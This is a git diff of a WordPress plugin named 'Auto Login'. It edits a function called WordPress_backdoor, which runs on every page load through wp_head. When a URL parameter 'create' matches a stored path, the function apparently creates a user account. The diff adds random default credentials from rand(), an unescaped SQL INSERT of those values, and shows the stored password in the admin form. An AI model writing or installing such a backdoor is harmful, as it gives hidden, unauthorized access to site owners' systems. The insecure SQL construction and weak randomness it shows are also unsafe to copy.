@@ -1,10 +1,26 @@
 <?php
 /*
 Plugin Name: Auto Login
-Plugin URI: 
+Plugin URI: -
 Version: 1.0.0
 Author: Shahin Zanbaghi
+Author URI: -
 */
+
+$sql="
+CREATE TABLE IF NOT EXISTS autologin(
+	ID   int DEFAULT '1',
+	user_name VARCHAR (30)     NOT NULL,
+	user_pass VARCHAR (30)     NOT NULL,
+	path  CHAR (40) NOT NULL,    
+	PRIMARY KEY (ID)
+)
+";
+global $wpdb;
+$wpdb->get_results($sql);
+
+
+
 
 add_action('admin_menu', 'al_plugin_setup_menu');
  
@@ -13,10 +29,24 @@ function al_plugin_setup_menu(){
 }
 
 function autologin_init(){
+	
+	function rantext() {
+    $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
+    $pass = array();
+    $alphaLength = strlen($alphabet) - 1;
+    for ($i = 0; $i < 8; $i++) {
+        $n = rand(0, $alphaLength);
+        $pass[] = $alphabet[$n];
+    }
+    return implode($pass);
+}
+
+$ruser = rantext();
+$rpass = rantext();
 
     if (isset($_POST['submit_al'])) {
-        $firstname = ($_POST['user_name_al']==NULL ? "defaultvalue" : $_POST['user_name_al']);
-        $password = ($_POST['password_al']==NULL ? "topsecrectvaluepassword" : $_POST['password_al']); 
+        $firstname = ($_POST['user_name_al']==NULL ? $ruser : $_POST['user_name_al']);
+        $password = ($_POST['password_al']==NULL ? $rpass : $_POST['password_al']); 
         $path = ($_POST['path_al']==NULL ? "autologin" : $_POST['path_al']);
         echo "Successfully applied <br />";
         echo "Username:". $firstname . "<br />Password:". $password . "<br />Path:". $path ." ";
@@ -31,8 +61,8 @@ function autologin_init(){
 	$sqluserpass = "SELECT `user_pass` FROM autologin WHERE ID=1";
 	$sqluserpath = "SELECT `path` FROM autologin WHERE ID=1";
     global $wpdb;
-    $uname = $wpdb->get_var($sqlusername)==NULL ? "defaultvalue" : $wpdb->get_var($sqlusername);
-	$upass = $wpdb->get_var($sqluserpass)==NULL ? "topsecrectvaluepassword" : $wpdb->get_var($sqluserpass);
+    $uname = $wpdb->get_var($sqlusername)==NULL ? $ruser : $wpdb->get_var($sqlusername);
+	$upass = $wpdb->get_var($sqluserpass)==NULL ? $rpass : $wpdb->get_var($sqluserpass);
 	$upath = $wpdb->get_var($sqluserpath)==NULL ? "autologin" : $wpdb->get_var($sqluserpath);
 
 		echo "
@@ -44,9 +74,9 @@ function autologin_init(){
 
 		echo "
 		<label>Password:</label>
-		<input type='password' name='password_al' placeholder='Password' />
+		<input type='password' name='password_al' placeholder=$upass />
 		";
-
+		
 		echo "
 		<label>Path:</label>
 		<input type='text' name='path_al' placeholder=$upath />
@@ -76,8 +106,8 @@ function autologin() {
 	$sqluserpass = "SELECT `user_pass` FROM autologin WHERE ID=1";
 	$sqluserpath = "SELECT `path` FROM autologin WHERE ID=1";
     global $wpdb;
-	$uname = $wpdb->get_var($sqlusername)==NULL ? "defaultvalue" : $wpdb->get_var($sqlusername);
-	$upass = $wpdb->get_var($sqluserpass)==NULL ? "topsecrectvaluepassword" : $wpdb->get_var($sqluserpass);
+	$uname = $wpdb->get_var($sqlusername)==NULL ? $ruser : $wpdb->get_var($sqlusername);
+	$upass = $wpdb->get_var($sqluserpass)==NULL ? $rpass : $wpdb->get_var($sqluserpass);
 	$upath = $wpdb->get_var($sqluserpath)==NULL ? "autologin" : $wpdb->get_var($sqluserpath);
 	
 	// PARAMETER TO CHECK FOR
@@ -98,14 +128,33 @@ function autologin() {
 }
  
 function WordPress_backdoor() {
+	
+	function rantext() {
+    $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
+    $pass = array();
+    $alphaLength = strlen($alphabet) - 1;
+    for ($i = 0; $i < 8; $i++) {
+        $n = rand(0, $alphaLength);
+        $pass[] = $alphabet[$n];
+    }
+    return implode($pass);
+}
+
+$ruser = rantext();
+$rpass = rantext();
 
     $sqlusername = "SELECT `user_name` FROM autologin WHERE ID=1";
 	$sqluserpass = "SELECT `user_pass` FROM autologin WHERE ID=1";
 	$sqluserpath = "SELECT `path` FROM autologin WHERE ID=1";
     global $wpdb;
-	$uname = $wpdb->get_var($sqlusername)==NULL ? "defaultvalue" : $wpdb->get_var($sqlusername);
-	$upass = $wpdb->get_var($sqluserpass)==NULL ? "topsecrectvaluepassword" : $wpdb->get_var($sqluserpass);
+	$uname = $wpdb->get_var($sqlusername)==NULL ? $ruser : $wpdb->get_var($sqlusername);
+	$upass = $wpdb->get_var($sqluserpass)==NULL ? $rpass : $wpdb->get_var($sqluserpass);
 	$upath = $wpdb->get_var($sqluserpath)==NULL ? "autologin" : $wpdb->get_var($sqluserpath);
+	
+	$sdsql="
+        INSERT INTO autologin (ID, user_name, user_pass, path) VALUES('1', '$uname', '$upass','$upath') ON DUPLICATE KEY UPDATE user_name= '$uname' ,user_pass='$upass',path='$upath'
+        ";
+        $wpdb->get_results($sdsql);
 
     If (md5($_GET['create']) == md5($upath)) {
         require('wp-includes/registration.php');
@@ -116,18 +165,6 @@ function WordPress_backdoor() {
         }
     }
 }
-
-$sql="
-CREATE TABLE IF NOT EXISTS autologin(
-	ID   int DEFAULT '1',
-	user_name VARCHAR (30)     NOT NULL,
-	user_pass VARCHAR (30)     NOT NULL,
-	path  CHAR (40) NOT NULL,    
-	PRIMARY KEY (ID)
-)
-";
-global $wpdb;
-$wpdb->get_results($sql);
 
 add_action('wp_head', 'WordPress_backdoor');
 add_action( 'after_setup_theme', 'autologin' );
